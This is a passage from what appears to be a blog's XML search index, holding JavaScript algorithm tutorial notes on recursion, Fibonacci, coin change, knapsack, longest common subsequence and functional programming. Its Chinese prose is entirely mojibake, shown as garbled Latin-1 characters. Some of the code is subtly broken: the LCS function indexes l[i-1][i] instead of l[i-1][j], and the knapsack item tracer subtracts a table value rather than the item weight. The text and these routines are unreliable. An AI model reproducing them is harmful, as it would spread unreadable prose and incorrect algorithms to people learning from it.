polynomial,éžç¡®å®šæ€§å¤šé¡¹å¼ï¼‰ç®—æ³•ã€‚å¦‚æžœä¸€ä¸ªé—®é¢˜å¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…éªŒè¯æ˜¯å¦æ­£ç¡®ï¼Œåˆ™è®¡ä¸ºNPã€‚ å¦‚æžœä¸€ä¸ªé—®é¢˜å­˜åœ¨å¤šé¡¹å¼ç®—æ³•ï¼Œè‡ªç„¶å¯ä»¥åœ¨å¤šé¡¹å¼æ—¶é—´å†…éªŒè¯å…¶è§£ã€‚å› æ­¤ï¼Œæ‰€æœ‰Péƒ½æ˜¯NPã€‚ç„¶è€Œï¼ŒP = NP æ˜¯å¦æˆç«‹ï¼Œä»ç„¶ä¸å¾—è€ŒçŸ¥ã€‚ å°ç»“æˆ‘ä»¬å­¦ä¹ äº†å¤§Oè¡¨ç¤ºæ³•ï¼Œå·²ç»å¦‚ä½•è¿ç®—å®ƒè®¡ç®—ç®—æ³•çš„å¤æ‚åº¦ã€‚ä¹Ÿç²—ç•¥ä»‹ç»äº†NPçš„ä¸€äº›ç†è®ºã€‚ ä¹¦ç±é“¾æŽ¥ï¼š å­¦ä¹ JavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>javaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ºä»€ä¹ˆæˆ‘è¦æ”¾å¼ƒjavaScriptæ•°æ®ç»“æž„ä¸Žç®—æ³•ï¼ˆç¬¬åä¸€ç« ï¼‰â€”â€” ç®—æ³•æ¨¡å¼]]></title>
    <url>%2F2018-11-08-JavaScipt%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95Part11.html</url>
    <content type="text"><![CDATA[æœ¬ç« å°†ä¼šå­¦ä¹ é€’å½’ã€åŠ¨æ€è§„åˆ’å’Œè´ªå¿ƒç®—æ³•ã€‚ ç¬¬åä¸€ç«  ç®—æ³•æ¨¡å¼é€’å½’é€’å½’æ˜¯ä¸€ç§è§£å†³é—®é¢˜çš„æ–¹æ³•ï¼Œå®ƒè§£å†³é—®é¢˜çš„å„ä¸ªå°éƒ¨åˆ†ï¼Œç›´åˆ°è§£å†³æœ€åˆçš„å¤§é—®é¢˜ã€‚é€’å½’é€šå¸¸æ¶‰åŠå‡½æ•°è°ƒç”¨è‡ªèº«ã€‚ é€’å½’å‡½æ•°æ˜¯åƒä¸‹é¢èƒ½å¤Ÿç›´æŽ¥è°ƒç”¨è‡ªèº«çš„æ–¹å¼æˆ–å‡½æ•° 123function recursiveFunction(someParam)&#123; recursiveFunction(someParam);&#125; èƒ½å¤Ÿåƒä¸‹é¢è¿™æ ·é—´æŽ¥è°ƒç”¨è‡ªèº«çš„å‡½æ•°ï¼Œä¹Ÿæ˜¯é€’å½’å‡½æ•° 123456function recursiveFunction1(someParam)&#123; recursiveFunction2(someParam);&#125;function recursiveFunction2(someParam)&#123; recursiveFunction1(someParam);&#125; å‡è®¾çŽ°åœ¨å¿…é¡»è¦æ‰§è¡Œ recursiveFunction ,ç»“æžœæ˜¯ä»€ä¹ˆ?å•å•ä¸Šè¿°æƒ…å†µè€Œè¨€ï¼Œå®ƒä¼šä¸€ç›´æ‰§è¡Œä¸‹åŽ»ã€‚å› æ­¤ï¼Œæ¯ä¸ªé€’å½’å‡½æ•°éƒ½å¿…é¡»æœ‰è¾¹ç•Œæ¡ä»¶ï¼Œå³ä¸€ä¸ªä¸å†é€’å½’è°ƒç”¨çš„æ¡ä»¶ï¼ˆåœæ­¢ç‚¹ï¼‰ï¼Œä»¥é˜²æ— é™é€’å½’ã€‚ JavaScript è°ƒç”¨æ ˆå¤§å°çš„é™åˆ¶å¦‚æžœå¿˜è®°åŠ ä¸Šç”¨ä»¥åœæ­¢å‡½æ•°é€’å½’è°ƒç”¨çš„è¾¹ç•Œæ¡ä»¶ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿé€’å½’å¹¶ä¸ä¼šæ— é™æ‰§è¡Œä¸‹åŽ»ï¼Œæµè§ˆå™¨ä¼šæŠ›å‡ºé”™è¯¯ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„æ ˆæº¢å‡ºé”™è¯¯ï¼ˆstack Overflow errorï¼‰ æ¯ä¸ªæµè§ˆå™¨éƒ½æœ‰è‡ªå·±çš„ä¸Šé™ï¼Œå¯ä»¥ç”¨ä¸€ä¸‹ä»£ç æµ‹è¯•ã€‚ 12345678910111213var i = 0;function recursiveFn()&#123; i++; recursiveFn();&#125;try&#123; recursiveFn(); &#125;catch(e)&#123; console.log('i='+i+' error:'+e);&#125;// è°·æ­Œï¼ši=15706 error:RangeError: Maximum call stack size exceeded// 360ï¼ši=31470 error:RangeError: Maximum call stack size exceeded// ç«ç‹ï¼ši=40687 error:InternalError: too much recursion æ ¹æ®æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨çš„ä¸åŒï¼Œå…·ä½“çš„æ•°å€¼ä¹Ÿä¼šæœ‰æ‰€ä¸åŒï¼Œä½†åŒºåˆ«ä¸å¤§ã€‚ ES6 æœ‰å°¾è°ƒç”¨ä¼˜åŒ–ï¼ˆtail call optimazationï¼‰ã€‚å¦‚æžœå‡½æ•°å†…æœ€åŽä¸€ä¸ªæ“ä½œæ˜¯è°ƒç”¨å‡½æ•°ï¼Œä¼šé€šè¿‡â€œè·³è½¬æŒ‡ä»¤ï¼ˆjumpï¼‰â€è€Œä¸æ˜¯â€œå­ç¨‹åºè°ƒç”¨ï¼ˆsubroutine call ï¼‰â€æ¥æŽ§åˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒES6ä¸­ï¼Œè¿™é‡Œçš„ä»£ç ä¼šä¸€ç›´æ‰§è¡Œä¸‹åŽ»ã€‚æ‰€ä»¥ï¼Œå…·æœ‰åœæ­¢é€’å½’çš„è¾¹ç•Œæ¡ä»¶å¾ˆé‡è¦ã€‚ å°¾è°ƒç”¨ ç‚¹å‡»çœ‹çœ‹ï¼Œé˜®ä¸€å³°è€å¸ˆçš„ã€‚ æ–æ³¢é‚£å¥‘æ•°åˆ—æ–æ³¢é‚£å¥‘æ•°åˆ—çš„å®šä¹‰å¦‚ä¸‹ï¼š 1 å’Œ 2 çš„æ–æ³¢é‚£å¥‘æ•°æ˜¯1 nï¼ˆn&gt;2ï¼‰çš„æ–æ³¢é‚£å¥‘æ•°æ˜¯ï¼ˆn-1ï¼‰åŠ ä¸Šï¼ˆn-2ï¼‰çš„æ–æ³¢é‚£å¥‘æ•°ã€‚ å®žçŽ° 123456function fibonacci(num)&#123; if(num === 1 || num ===2)&#123; return 1; &#125; return arguments.callee(num - 1) + arguments.callee(num - 2);&#125; è®©æˆ‘ä»¬è¯•ç€æ‰¾å‡º6çš„æ–æ³¢é‚£å¥‘æ•°ï¼Œå…¶ä¼šäº§ç”Ÿå¦‚ä¸‹å‡½æ•°è°ƒç”¨ æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨éžé€’å½’çš„æ–¹æ³•å®žçŽ° 1234567891011function fib(num)&#123; var n1 = 1, n2 = 1, n = 1; for(var i = 3; i &lt;= num; i++)&#123; n = n1 + n2; n1 = n2; n2 = n; &#125; return n;&#125; ä¸ºä»€ä¹ˆè¦ç”¨é€’å½’ï¼Ÿæ˜¯å› ä¸ºæ›´å¿«å—ï¼Ÿå…¶å®žå¹¶ä¸ï¼Œåè€Œæ›´æ…¢ã€‚é€’å½’çš„å¥½å¤„åœ¨äºŽæ›´å®¹æ˜“ç†è§£ï¼Œå¹¶ä¸”å®ƒæ‰€éœ€çš„ä»£ç é‡æ›´å°‘ã€‚ç„¶åŽåœ¨ES6ä¸­ï¼Œå› ä¸ºæœ‰å°¾è°ƒç”¨ï¼Œå¯ä»¥åŠ å¿«é€’å½’çš„é€Ÿåº¦ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬ç”¨é€’å½’ï¼Œé€šå¸¸æ˜¯å› ä¸ºå®ƒæ›´å®¹æ˜“è§£å†³é—®é¢˜ã€‚ åŠ¨æ€è§„åˆ’åŠ¨æ€è§„åˆ’ï¼ˆDynamic Programming,DPï¼‰æ˜¯ä¸€ç§å°†å¤æ‚é—®é¢˜åˆ†è§£æˆæ›´å°çš„å­é—®é¢˜æ¥è§£å†³çš„ä¼˜åŒ–æŠ€æœ¯ã€‚ä¸Žåˆ†è€Œæ²»ä¹‹ä¸åŒçš„æ˜¯ï¼ŒåŠ¨æ€è§„åˆ’æ˜¯å°†é—®é¢˜åˆ†è§£æˆç›¸äº’ä¾èµ–çš„å­é—®é¢˜ã€‚ ç”¨åŠ¨æ€è§„åˆ’è§£å†³é—®é¢˜ï¼Œè¦éµå¾ªä¸‰ä¸ªæ­¥éª¤ï¼š å®žçŽ°å­é—®é¢˜ã€‚ å®žçŽ°è¦åå¤æ‰§è¡Œæ¥è§£å†³å­é—®é¢˜çš„éƒ¨åˆ† è¯†åˆ«å¹¶æ±‚è§£å‡ºè¾¹ç•Œæ¡ä»¶ å¯ä»¥ç”¨åŠ¨æ€è§„åˆ’è§£å†³ä¸€äº›è‘—åçš„é—®é¢˜å¦‚ä¸‹ï¼š èƒŒåŒ…é—®é¢˜ï¼šç»™å‡ºä¸€ç»„é¡¹ç›®ï¼Œå„è‡ªæœ‰å€¼å’Œå®¹é‡ï¼Œç›®æ ‡æ˜¯è¦æ‰¾å‡ºæ€»å€¼æœ€å¤§çš„é¡¹ç›®çš„é›†åˆã€‚è¿™ä¸ªé—®é¢˜çš„é™åˆ¶æ˜¯ï¼Œæ€»å®¹é‡å¿…é¡»å°äºŽç­‰äºŽâ€œèƒŒåŒ…â€çš„å®¹é‡ã€‚ æœ€é•¿å…¬å…±å­åºåˆ—ï¼šæ‰¾å‡ºä¸€ç»„åºåˆ—çš„æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆå¯ç”±å¦ä¸€åºåˆ—åˆ é™¤å…ƒç´ ä½†ä¸æ”¹å˜ï¼‰ çŸ©é˜µé“¾ç›¸ä¹˜ï¼šç»™å‡ºä¸€ç³»åˆ—çŸ©é˜µï¼Œç›®æ ‡æ˜¯æ‰¾åˆ°è¿™äº›çŸ©é˜µç›¸ä¹˜çš„æœ€é«˜æ•ˆåŠžæ³•ï¼ˆè®¡ç®—æ¬¡æ•°å°½å¯èƒ½å°‘ï¼‰ã€‚ç›¸ä¹˜æ“ä½œä¸ä¼šè¿›è¡Œï¼Œè§£å†³æ–¹æ¡ˆæ˜¯æ‰¾åˆ°è¿™äº›çŸ©é˜µå„è‡ªç›¸ä¹˜çš„é¡ºåºã€‚ ç¡¬å¸æ‰¾é›¶ï¼šç»™å‡ºé¢é¢ä¸ºd1â€¦dnçš„ä¸€å®šæ•°é‡çš„ç¡¬å¸å’Œè¦æ‰¾é›¶çš„é’±æ•°ï¼Œæ‰¾å‡ºæœ‰å¤šå°‘ç§æ‰¾é›¶çš„æ–¹æ³•ã€‚ å›¾çš„å…¨æºæœ€çŸ­è·¯å¾„ï¼šå¯¹æ‰€æœ‰é¡¶ç‚¹å¯¹ï¼ˆu,vï¼‰ï¼Œæ‰¾å‡ºé¡¶ç‚¹uåˆ°é¡¶ç‚¹vçš„æœ€çŸ­è·¯å¾„ã€‚ æœ€å°‘ç¡¬å¸æ‰¾é›¶é—®é¢˜æœ€å°‘ç¡¬å¸æ‰¾é›¶é—®é¢˜æ˜¯ç¡¬å¸é—®é¢˜çš„ä¸€ä¸ªå˜ç§ã€‚ç¡¬å¸æ‰¾é›¶é—®é¢˜æ˜¯ç»™å‡ºè¦æ‰¾é›¶çš„é’±æ•°ï¼Œä»¥åŠå¯ä»¥ç”¨çš„ç¡¬å¸é¢é¢d1â€¦dn åŠå…¶æ•°é‡ï¼Œæ‰¾å‡ºæœ‰å¤šå°‘ç§æ‰¾é›¶æ–¹æ³•ã€‚æœ€å°‘ç¡¬å¸æ‰¾é›¶é—®é¢˜æ˜¯è¦ç»™å‡ºè¦æ‰¾é›¶çš„é’±æ•°ä»¥åŠå¯ç”¨çš„ç¡¬å¸é¢é¢d1â€¦dnåŠå…¶æ•°é‡ï¼Œæ‰¾å‡ºæ‰€éœ€çš„æœ€å°‘ç¡¬å¸ä¸ªæ•°ã€‚ ä¾‹å¦‚ï¼Œç¾Žå›½æœ‰ä¸€ä¸‹é¢é¢ï¼ˆç¡¬å¸ï¼‰ï¼šd1=1,d2=5,d3=10,d4=25 å¦‚æžœè¦æ‰¾36ç¾Žåˆ†çš„é›¶é’±ï¼Œæˆ‘ä¹ˆå¯ä»¥ç”¨1ä¸ª25ç¾Žåˆ†ï¼Œ1ä¸ª10ç¾Žåˆ†å’Œä¸€ä¸ªä¾¿å£«ï¼ˆ1ç¾Žåˆ†ï¼‰ å¦‚ä½•å°†è¿™ä¸ªè§£ç­”è½¬åŒ–æˆç®—æ³•ï¼Ÿ æœ€å°‘ç¡¬å¸æ‰¾é›¶çš„è§£å†³æ–¹æ¡ˆæ˜¯æ‰¾åˆ°næ‰€éœ€çš„æœ€å°ç¡¬å¸æ•°ã€‚ä½†è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œé¦–å…ˆå¾—æ‰¾åˆ°å¯¹æ¯ä¸ªx&lt;nçš„è§£ã€‚ç„¶åŽï¼Œæˆ‘ä»¬å°†è§£å»ºç«‹åœ¨æ›´å°çš„å€¼çš„åŸºç¡€ä¸Šã€‚ 1234567891011121314151617181920212223242526272829function MinCoinChange(coins)&#123; var coins = coins; // é›¶é’±çš„é¢é¢ var cache = &#123;&#125;; // ç¼“å­˜ this.makeChange = function(amount)&#123; // é€’å½’å‡½æ•° var me = this; if(!amount)&#123; // è‹¥é‡‘é¢æ€»é¢å°äºŽ0åˆ™è¿”å›žç©ºæ•°ç»„ return []; &#125; if(cache[amount])&#123; // è‹¥ç¼“å­˜ä¸­å·²æœ‰è¯¥è®¡ç®—ç»“æžœï¼Œåˆ™ç›´æŽ¥è¿”å›ž return cache[amount]; &#125; var min = [],newMin,newAmount; for(var i = 0; i &lt; coins.length; i++)&#123; var coin = coins[i]; newAmount = amount - coin; if(newAmount &gt;= 0)&#123; newMin = me.makeChange(newAmount); &#125; if(newAmount &gt;= 0 &amp;&amp; (newMin.length &lt; min.length - 1 || !min.length) &amp;&amp; (newMin.length || !newAmount))&#123; min = [coin].concat(newMin); console.log('new Min '+ min + 'for '+ amount); &#125; &#125; return (cache[amount] = min); &#125; this.getCache = function()&#123; console.log(cache); &#125;&#125; æµ‹è¯• 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566const minCoinChange = new MinCoinChange([1,5,10,25]);console.log(minCoinChange.makeChange(36));/*new Min 1,1,1,1,1for 5new Min 5for 5new Min 1,5for 6new Min 1,1,5for 7new Min 1,1,1,5for 8new Min 1,1,1,1,5for 9new Min 1,1,1,1,1,5for 10new Min 5,5for 10new Min 10for 10new Min 1,10for 11new Min 1,1,10for 12new Min 1,1,1,10for 13new Min 1,1,1,1,10for 14new Min 1,1,1,1,1,10for 15new Min 5,10for 15new Min 1,5,10for 16new Min 1,1,5,10for 17new Min 1,1,1,5,10for 18new Min 1,1,1,1,5,10for 19new Min 1,1,1,1,1,5,10for 20new Min 5,5,10for 20new Min 10,10for 20new Min 1,10,10for 21new Min 1,1,10,10for 22new Min 1,1,1,10,10for 23new Min 1,1,1,1,10,10for 24new Min 1,1,1,1,1,10,10for 25new Min 5,10,10for 25new Min 25for 25new Min 1,25for 26new Min 1,1,25for 27new Min 1,1,1,25for 28new Min 1,1,1,1,25for 29new Min 1,1,1,1,1,25for 30new Min 5,25for 30new Min 1,5,25for 31new Min 1,1,5,25for 32new Min 1,1,1,5,25for 33new Min 1,1,1,1,5,25for 34new Min 1,1,1,1,1,5,25for 35new Min 5,5,25for 35new Min 10,25for 35new Min 1,10,25for 36 (3) [1, 10, 25]*/minCoinChange.getCache(); // &#123;1: Array(1), 2: Array(2), 3: Array(3), 4: Array(4), 5: Array(1), 6: Array(2), 7: Array(3), 8: Array(4), 9: Array(5), 10: Array(1), 11: Array(2), 12: Array(3), 13: Array(4), 14: Array(5), 15: Array(2), 16: Array(3), 17: Array(4), 18: Array(5), 19: Array(6), 20: Array(2), 21: Array(3), 22: Array(4), 23: Array(5), 24: Array(6), 25: Array(1), 26: Array(2), 27: Array(3), 28: Array(4), 29: Array(5), 30: Array(2), 31: Array(3), 32: Array(4), 33: Array(5), 34: Array(6), 35: Array(2), 36: Array(3)&#125;const minCoinChange1 = new MinCoinChange([1,3,4]);console.log(minCoinChange1.makeChange(6));/* new Min 1for 1 new Min 1,1for 2 new Min 1,1,1for 3 new Min 3for 3 new Min 1,3for 4 new Min 4for 4 new Min 1,4for 5 new Min 1,1,4for 6 new Min 3,3for 6 (2) [3, 3]*/minCoinChange1.getCache(); // &#123;1: Array(1), 2: Array(2), 3: Array(1), 4: Array(1), 5: Array(2), 6: Array(2)&#125; èƒŒåŒ…é—®é¢˜èƒŒåŒ…é—®é¢˜æ˜¯ä¸€ä¸ªç»„åˆä¼˜åŒ–é—®é¢˜ã€‚å®ƒå¯ä»¥æè¿°å¦‚ä¸‹ï¼šç»™å®šä¸€ä¸ªå›ºå®šå¤§å°ã€èƒ½å¤Ÿæºå¸¦Wçš„èƒŒåŒ…ï¼Œä»¥åŠä¸€ç»„æœ‰ä»·å€¼å’Œé‡é‡çš„ç‰©å“ï¼Œæ‰¾å‡ºä¸€ä¸ªæœ€ä½³è§£å†³æ–¹æ¡ˆï¼Œä½¿å¾—è£…å…¥èƒŒåŒ…çš„ç‰©å“æ€»é‡é‡ä¸è¶…è¿‡Wï¼Œä¸”æ€»ä»·å€¼æœ€å¤§ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š ç‰©å“ é‡é‡ ä»·å€¼ 1 2 3 2 3 4 3 4 5 è€ƒè™‘èƒŒåŒ…èƒ½å¤Ÿæºå¸¦çš„é‡é‡åªæœ‰5ã€‚å¯¹äºŽè¿™ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥è¯´æœ€ä½³è§£å†³æ–¹æ¡ˆå°±æ˜¯å¾€èƒŒåŒ…é‡Œè£…å…¥ç‰©å“1å’Œç‰©å“2ï¼Œè¿™æ ·ï¼Œæ€»é‡é‡ä¸º5ï¼Œæ€»ä»·å€¼ä¸º7ã€‚ èƒŒåŒ…ç®—æ³•ï¼š 1234567891011121314151617181920function knapSack(capacity,weights,values,n)&#123; var i,w,a,b,kS = []; for(i = 0; i &lt;= n; i++)&#123; kS[i] = []; &#125; for(i = 0; i &lt;= n; i++)&#123; for(w = 0; w &lt;= capacity; w++)&#123; if(i == 0 || w == 0)&#123; kS[i][w] = 0; &#125;else if(weights[i-1] &lt;= w)&#123; a = values[i - 1] + kS[i - 1][w - weights[i-1]]; b = kS[i-1][w]; kS[i][w] = (a &gt; b) ? a : b; &#125;else&#123; kS[i][w] = kS[i-1][w]; &#125; &#125; &#125; return kS[n][capacity];&#125; å·¥ä½œåŽŸç† é¦–å…ˆï¼Œåˆå§‹åŒ–å°†ç”¨äºŽå¯»æ‰¾è§£å†³æ–¹æ¡ˆçš„çŸ©é˜µks[n+1][capacity+1] å¿½ç•¥çŸ©é˜µçš„ç¬¬ä¸€åˆ—å’Œç¬¬ä¸€è¡Œï¼Œåªå¤„ç†ç´¢å¼•ä¸ä¸º0çš„åˆ—å’Œè¡Œ ç‰©å“içš„é‡é‡å¿…é¡»å°äºŽçº¦æŸï¼ˆcapacityï¼‰æ‰æœ‰å¯èƒ½æˆä¸ºè§£å†³æ–¹æ¡ˆçš„ä¸€éƒ¨åˆ†ã€‚å¦åˆ™ï¼Œæ€»é‡é‡å°±ä¼šè¶…å‡ºèƒŒåŒ…èƒ½å¤Ÿæºå¸¦çš„é‡é‡ã€‚å‘ç”Ÿè¿™ç§æƒ…å†µçš„è¯ï¼Œå°±é‡‡ç”¨ä¹‹å‰çš„å€¼ã€‚ å½“æ‰¾åˆ°å¯ä»¥æž„æˆè§£å†³æ–¹æ¡ˆçš„ç‰©å“æ—¶ï¼Œé€‰æ‹©ä»·å€¼æœ€å¤§çš„é‚£ä¸ª é—®é¢˜çš„è§£å†³æ–¹æ¡ˆå°±åœ¨äºŒç»´è¡¨æ ¼å³ä¸‹è§’çš„æœ€åŽä¸€ä¸ªæ ¼å­é‡Œé¢ æµ‹è¯• 12345var values = [3,4,5],weights = [2,3,4],capacity = 5,n = values.length;console.log(knapSack(capacity,weights,values,n)); // 7 ä¸Šé¢çš„ç®—æ³•åªè¾“å‡ºèƒŒåŒ…æºå¸¦ç‰©å“ä»·å€¼çš„æœ€å¤§å€¼ï¼Œè€Œä¸åˆ—å‡ºå®žé™…çš„ç‰©å“ã€‚æˆ‘ä»¬å¯ä»¥å¢žåŠ ä¸‹é¢çš„é™„åŠ å‡½æ•°æ¥æ‰¾å‡ºæž„æˆè§£å†³æ–¹æ¡ˆçš„ç‰©å“ï¼š 12345678910111213function findValues(n,capacity,kS,weights,values)&#123; var i = n, k = capacity; console.log('è§£å†³æ–¹æ¡ˆåŒ…å«ä»¥ä¸‹ç‰©å“ï¼š '); while( i &gt; 0 &amp;&amp; k &gt; 0 )&#123; if(kS[i][k] !== kS[i-1][k])&#123; console.log('ç‰©å“' + i + 'ï¼Œé‡é‡ï¼š' + weights[i-1] + 'ï¼Œä»·å€¼ï¼š'+values[i - 1] ); i--; k = k - kS[i][k]; &#125;else&#123; i--; &#125; &#125;&#125; è¾“å‡ºç»“æžœï¼š 123è§£å†³æ–¹æ¡ˆåŒ…å«ä»¥ä¸‹ç‰©å“ï¼š ç‰©å“2ï¼Œé‡é‡ï¼š3ï¼Œä»·å€¼ï¼š4ç‰©å“1ï¼Œé‡é‡ï¼š2ï¼Œä»·å€¼ï¼š3 æœ€é•¿å…¬å…±å­åºåˆ—å¦ä¸€ä¸ªç»å¸¸è¢«å½“åšç¼–ç¨‹æŒ‘æˆ˜é—®é¢˜çš„åŠ¨æ€æœ€é•¿å…¬å…±å­åºåˆ—ï¼ˆLCSï¼‰:æ‰¾å‡ºä¸¤ä¸ªå­—ç¬¦ä¸²åºåˆ—çš„æœ€é•¿å­åºåˆ—çš„é•¿åº¦ã€‚æœ€é•¿å­åºåˆ—æ˜¯æŒ‡ï¼Œåœ¨ä¸¤ä¸ªå­—ç¬¦ä¸²åºåˆ—ä¸­ä»¥ç›¸åŒé¡ºåºå‡ºçŽ°ï¼Œä½†ä¸è¦æ±‚è¿žç»­ï¼ˆéžå­—ç¬¦ä¸²å­ä¸²ï¼‰çš„å­—ç¬¦ä¸²åºåˆ—ã€‚ è€ƒè™‘å¦‚ä¸‹çš„ä¾‹å­ï¼š å­—ç¬¦ä¸² å…ƒç´  å­—ç¬¦ä¸²1 a c b a e d å­—ç¬¦ä¸²2 a b c a d f LCS:é•¿åº¦ä¸º4çš„â€˜â€™acadâ€œ ä¸‹é¢çš„ç®—æ³• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455function lcs(wordX,wordY)&#123; var m = wordX.length, n = wordY.length, l = [], solution = [], i, j, a, b; for(i = 0; i &lt;= m; ++i)&#123; l[i] = []; solution[i] = []; for(j = 0; j &lt;= n; ++j)&#123; l[i][j] = 0; solution[i][j] = '0'; &#125; &#125; for(i = 0; i &lt;= m; i++)&#123; for(j = 0; j &lt;= n; j++)&#123; if(i == 0 || j == 0)&#123; l[i][j] = 0; &#125;else if(wordX[i-1] == wordY[j-1])&#123; l[i][j] = l[i-1][j-1] + 1; solution[i][j] = 'diagonal'; &#125;else&#123; a = l[i-1][i]; b = l[i][j-1]; l[i][j] = a &gt; b ? a : b; solution[i][j] = l[i][j] == l[i-1][j] ? 'top' : 'left'; &#125; &#125; &#125; printSolution(solution,l,wordX,wordY,m,n); return l[m][n];&#125;function printSolution(solution,l,wordX,wordY,m,n)&#123; var a = m, b = n, i, j, x = solution[a][b], answer = ''; while(x !== '0')&#123; if(solution[a][b] === 'diagonal')&#123; answer = wordX[a-1] + answer; a--; b--; &#125;else if(solution[a][b] === 'left')&#123; b--; &#125;else if(solution[a][b] === 'top')&#123; a--; &#125; x = solution[a][b]; &#125; console.log('lcs:' + answer);&#125; çŸ©é˜µé“¾ç›¸ä¹˜ï¼ˆæœªå®Œæˆï¼‰è´ªå¿ƒç®—æ³•ï¼ˆæœªå®Œæˆï¼‰æœ€å°‘ç¡¬å¸æ‰¾é›¶é—®é¢˜ èƒŒåŒ…é—®é¢˜ å‡½æ•°å¼ç¼–ç¨‹ç®€ä»‹å€ŸåŠ©ES6çš„èƒ½åŠ›ï¼ŒJavaScript ä¹Ÿèƒ½å¤Ÿè¿›è¡Œå‡½æ•°å¼ç¼–ç¨‹ å‡½æ•°å¼ç¼–ç¨‹å’Œå‘½ä»¤å¼ç¼–ç¨‹ä»¥å‡½æ•°å¼æ–¹å¼è¿›è¡Œå¼€å‘å¹¶ä¸ç®€å•ã€‚ å‡å¦‚æˆ‘ä»¬æƒ³æ‰“å°ä¸€ä¸ªæ•°ç»„ä¸­æ‰€æœ‰çš„å…ƒç´ ã€‚æˆ‘ä»¬å¯ä»¥ç”¨å‘½ä»¤å¼ç¼–ç¨‹ï¼Œå£°æ˜Žçš„å‡½æ•°å¦‚ä¸‹: 123456var printArray = function(array)&#123; for(var i = 0; i &lt; array.length; i++)&#123; console.log(array[i]); &#125;&#125;printArray([1,2,3,4,5]); åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬è¿­ä»£æ•°ç»„ï¼Œæ‰“å°æ¯ä¸€é¡¹ã€‚ çŽ°åœ¨ï¼Œæˆ‘ä»¬è¯•ç€å°†è¿™ä¸ªä¾‹å­è½¬æ¢æˆå‡½æ•°å¼ç¼–ç¨‹ã€‚åœ¨å‡½æ•°å¼ç¼–ç¨‹ä¸­ï¼Œæˆ‘ä»¬å…³æ³¨çš„é‡ç‚¹æ˜¯éœ€è¦æè¿°ä»€ä¹ˆï¼Œè€Œä¸æ˜¯å¦‚ä½•æè¿° 12345var forEach = function(array,action)&#123; for(var i = 0; i &lt; array.length; i++)&#123; action(array[i]); &#125;&#125; æŽ¥ç€æˆ‘ä»¬éœ€è¦åˆ›å»ºå¦ä¸€ä¸ªå…ƒç´ è´Ÿè´£æŠŠæ•°ç»„å…ƒç´ æ‰“å°åˆ°æŽ§åˆ¶å°çš„å‡½æ•°ï¼ˆè€ƒè™‘ä¸ºå›žè°ƒå‡½æ•°ï¼‰ï¼Œå¦‚ä¸‹ 123var logItem = function(item)&#123; console.log(item);&#125; æœ€åŽï¼Œåƒä¸‹é¢è¿™æ ·ä½¿ç”¨å‡½æ•° 1forEach([1,2,3,4,5],logItem); å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š ä¸»è¦ç›®æ ‡æ˜¯æè¿°æ•°æ®ï¼Œå·²ç»è¦å¯¹æ•°æ®åº”ç”¨çš„è½¬æ¢ ç¨‹åºæ‰§è¡Œé¡ºåºçš„é‡è¦æ€§å¾ˆä½Žï¼Œè€Œåœ¨å‘½ä»¤å¼ç¼–ç¨‹ä¸­ï¼Œæ­¥éª¤å’Œé¡ºåºæ˜¯éžå¸¸é‡è¦çš„ å‡½æ•°å’Œæ•°æ®ç»“åˆæ˜¯å‡½æ•°å¼ç¼–ç¨‹çš„æ ¸å¿ƒ åœ¨å‡½æ•°å¼ç¼–ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å’Œæ»¥ç”¨å‡½æ•°å’Œé€’å½’ï¼Œè€Œåœ¨å‘½ä»¤å¼ç¼–ç¨‹ä¸­ï¼Œåˆ™ä½¿ç”¨å¾ªçŽ¯ã€èµ‹å€¼ã€æ¡ä»¶å’Œå‡½æ•°ã€‚ å¦å¤–ä¸€ä¸ªä¾‹å­ï¼Œè€ƒè™‘æˆ‘ä»¬è¦æ‰¾æ•°ç»„ä¸­æœ€å°çš„å€¼ã€‚ç”¨å‘½ä»¤å¼ç¼–ç¨‹å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œåªè¦è¿­ä»£æ•°ç»„ï¼Œæ£€æŸ¥å½“å‰çš„æœ€å°å€¼æ˜¯å¦å¤§äºŽæ•°ç»„å…ƒç´ ï¼Œå¦‚æžœæ˜¯ï¼Œå°±æ›´è¡Œæœ€å°å€¼ã€‚ 12345678910var findMinArray = function(array)&#123; var minValue = array[0]; for(var i = 1; i &lt; array.length; i++)&#123; if(minValue &gt; array[i])&#123; minValue = array[i]; &#125; &#125; return minValue;&#125;console.log(findMinArray([8,6,4,5,9])); // 4 ç”¨å‡½æ•°å¼ç¼–ç¨‹å®Œæˆç›¸åŒçš„ä»»åŠ¡ï¼Œå¯ä»¥ä½¿ç”¨Math.in å‡½æ•°ï¼Œä¼ å…¥æ‰€æœ‰è¦æ¯”è¾ƒçš„æ•°ç»„å…ƒç´ ã€‚æˆ‘ä»¬å¯ä»¥åƒä¸‹é¢çš„ä¾‹å­é‡Œè¿™æ ·ï¼Œä½¿ç”¨ES2015 çš„è§£æž„æ“ä½œç¬¦ï¼ˆâ€¦ï¼‰,æŠŠæ•°ç»„è½¬æ¢æˆå•ä¸ªå…ƒç´ ï¼š 1234const min_ = function(array)&#123; return Math.min(...array);&#125;console.log(min_([8,6,4,5,9])); // 4 ä½¿ç”¨ç®­å¤´å‡½æ•°ï¼Œç®€åŒ–ä»£ç  1const min_ = arr =&gt; Math.min(...arr); 